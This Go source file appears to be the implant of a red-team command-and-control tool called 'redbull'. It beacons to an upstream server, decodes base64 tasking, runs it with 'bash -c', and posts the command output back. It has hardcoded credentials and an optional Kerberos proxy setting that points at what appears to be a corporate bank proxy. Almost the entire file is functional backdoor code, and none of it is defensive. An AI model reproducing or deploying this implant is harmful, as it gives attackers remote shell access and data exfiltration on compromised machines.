package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path"
	"strings"
	"syscall"
	"time"

	"redbull/internal/rbhttp"
	"redbull/internal/rbkrb"
)

var USERNAME = "zkokkdc"
var PASSWORD = "foobar"
var UPSTREAM = "http://localhost:8000"
var PROXY_URL = "http://abproxy.bankofamerica.com:8080"
var USE_KRB = false
var SLEEP_TIME = 1 * time.Second
var CWD = ""

var COMMAND_MAP = map[string]func(cmd string) (string, string, error){
	"shell": runBashWithTimeout,
	"pwd":   getCwd,
	"cd":    changeDirectory,
	"ls":    listDirectory,
}

func init() {
	cwd, err := os.Getwd()

	if err != nil {
		panic(err)
	}

	CWD = cwd
}

func getCwd(_ string) (string, string, error) {
	return CWD, "", nil
}

func changeDirectory(command string) (string, string, error) {
	newCwd := path.Join(CWD, command)
	res, err := os.Stat(newCwd)
	if os.IsNotExist(err) {
		return "", "", fmt.Errorf("invalid path '%s': path does not exist", newCwd)
	}

	if !res.IsDir() {
		return "", "", fmt.Errorf("invalid path '%s': not a directory", newCwd)
	}

	CWD = newCwd
	return fmt.Sprintf("changed directory to %s", CWD), "", nil
}

func listDirectory(_ string) (string, string, error) {
	files, err := os.ReadDir(CWD)
	if err != nil {
		return "", "", fmt.Errorf("failed to read directory %s: %w", CWD, err)
	}

	fileNames := make([]string, 0)
	for _, f := range files {
		fileNames = append(fileNames, f.Name())
	}

	return strings.Join(fileNames, "\n"), "", nil
}

func runBashWithTimeout(command string) (string, string, error) {
	timeout := 100 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "bash", "-c", command)

	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err := cmd.Run()
	if ctx.Err() == context.DeadlineExceeded {
		return outBuf.String(), errBuf.String(), fmt.Errorf("connection timed out after %v", timeout)
	}

	return outBuf.String(), errBuf.String(), err
}

func parseAndExecuteCommand(command string) (string, string, error) {
	commandGroups := strings.Split(command, " ")
	if len(commandGroups) == 0 {
		return "", "", fmt.Errorf("no command groups found for command %s", command)
	}

	commandName := commandGroups[0]
	commandArgs := strings.Join(commandGroups[1:], " ")

	if fn, ok := COMMAND_MAP[commandName]; ok {
		return fn(commandArgs)
	} else {
		return "", "", fmt.Errorf("no command '%s' found", command)
	}
}

func main() {
	termSig := make(chan os.Signal, 1)
	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)

	var httpClient rbhttp.HttpClient
	if USE_KRB {
		var err error
		httpClient, err = rbkrb.NewProxyAwareHttpClient(PROXY_URL, PASSWORD)
		if err != nil {
			panic(err)
		}
	} else {
		httpClient = rbhttp.NewSimpleHttpClient()
	}

	for {
		select {
		case <-termSig:
			return
		default:
			time.Sleep(SLEEP_TIME)

			resp, err := httpClient.Get(UPSTREAM)
			if err != nil {
				continue
			}

			if resp.StatusCode != 200 {
				resp.Body.Close()
				continue
			}

			var checkIn rbhttp.CheckInResponse
			if err := json.NewDecoder(resp.Body).Decode(&checkIn); err != nil {
				resp.Body.Close()
				sendResult(httpClient, "", "", err.Error())
				continue
			}
			resp.Body.Close()

			decoded, err := base64.StdEncoding.DecodeString(checkIn.Command)
			if err != nil {
				sendResult(httpClient, "", "", err.Error())
				continue
			}

			command := string(decoded)
			stdout, stderr, err := parseAndExecuteCommand(command)

			if err != nil {
				stderr = fmt.Sprintf("%s\nerror: %s", stderr, err.Error())
			}

			sendResult(httpClient, command, stdout, stderr)
		}
	}
}

func sendResult(httpClient rbhttp.HttpClient, command, stdout, stderr string) {
	result := rbhttp.HttpBody{
		Command: command,
		Stdout:  stdout,
		Stderr:  stderr,
	}
	jsonBytes, err := json.Marshal(result)
	if err != nil {
		result = rbhttp.HttpBody{
			Command: command,
			Stdout:  "error: failed to marshal response",
			Stderr:  fmt.Sprintf("error: %s", err.Error()),
		}
		jsonBytes, err = json.Marshal(result)
		if err != nil {
			panic(err)
		}
	}
	httpClient.Post(UPSTREAM, "application/json", bytes.NewReader(jsonBytes))
}
